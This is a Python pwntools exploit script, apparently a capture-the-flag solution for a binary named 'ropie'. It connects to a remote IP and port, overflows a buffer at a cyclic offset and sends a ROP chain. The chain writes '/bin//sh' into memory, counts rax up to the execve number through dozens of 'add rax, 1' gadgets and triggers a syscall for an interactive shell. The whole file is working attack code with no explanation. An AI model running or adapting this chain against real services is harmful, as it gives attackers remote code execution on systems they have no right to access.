from pwn import *
from struct import pack

#r = process('./ropie')
r = remote('161.35.15.117', 4427)
#debugging
#gdb.attach(r)
payload = "A" * cyclic_find('gaaa') #offset
#rop chain // ropper o ROPgadget sale facil solo debes tener un pop ecx
payload += pack('<Q', 0x000000000040766e) # pop rsi ; ret
payload += pack('<Q', 0x00000000004a80e0) # @ .data
payload += pack('<Q', 0x000000000044611c) # pop rax ; ret
payload += '/bin//sh'
payload += pack('<Q', 0x000000000046ef51) # mov qword ptr [rsi], rax ; ret
payload += pack('<Q', 0x000000000040766e) # pop rsi ; ret
payload += pack('<Q', 0x00000000004a80e8) # @ .data + 8
payload += pack('<Q', 0x000000000043b405) # xor rax, rax ; ret
payload += pack('<Q', 0x000000000046ef51) # mov qword ptr [rsi], rax ; ret
payload += pack('<Q', 0x00000000004017c6) # pop rdi ; ret
payload += pack('<Q', 0x00000000004a80e0) # @ .data
payload += pack('<Q', 0x000000000040766e) # pop rsi ; ret
payload += pack('<Q', 0x00000000004a80e8) # @ .data + 8
payload += pack('<Q', 0x0000000000445765) # pop rdx ; ret
payload += pack('<Q', 0x00000000004a80e8) # @ .data + 8
payload += pack('<Q', 0x000000000043b405) # xor rax, rax ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004659c0) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000040fb55) # syscall

r.sendline(payload)
r.interactive()